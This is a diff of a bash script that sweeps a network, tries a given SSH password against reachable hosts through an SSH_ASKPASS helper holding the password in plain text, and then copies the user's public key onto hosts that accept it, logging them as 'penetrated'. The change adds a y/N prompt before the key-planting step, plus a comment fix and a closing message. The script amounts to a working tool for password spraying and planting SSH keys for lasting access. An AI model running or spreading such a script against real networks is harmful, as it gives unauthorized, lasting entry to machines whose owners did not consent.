@@ -21,7 +21,7 @@ done
 sleep "$timeout"
 cat "$reachable"
 
-# Prepare a program to output password to ssh
+# Prepare a program to output the password to ssh
 echo "echo '$password'" >> "$getpassword"
 chmod +x "$getpassword"
 export SSH_ASKPASS="$getpassword" DISPLAY=
@@ -40,12 +40,18 @@ sleep "$timeout"
 cat "$unsecure"
 
 # Add your public key to unsecure hosts
-echo "Penetrated hosts on the network:"
-while read ip; do
-    (setsid ssh-copy-id "$ip" >/dev/null 2>&1 && echo "$ip" >> "$penetrated" &)
-done < "$unsecure"
-sleep "$timeout"
-cat "$penetrated"
+read -s -n 1 -p "Add public key to unsecure hosts? (y/N): " answer
+echo
+if [ "$answer" = "y" ]; then
+    echo "Penetrated hosts on the network:"
+    while read ip; do
+        (setsid ssh-copy-id "$ip" >/dev/null 2>&1 && echo "$ip" >> "$penetrated" &)
+    done < "$unsecure"
+    sleep "$timeout"
+    cat "$penetrated"
+fi
 
 # Remove temporary files
 rm "$reachable" "$getpassword" "$unsecure" "$penetrated"
+
+echo "Bye."
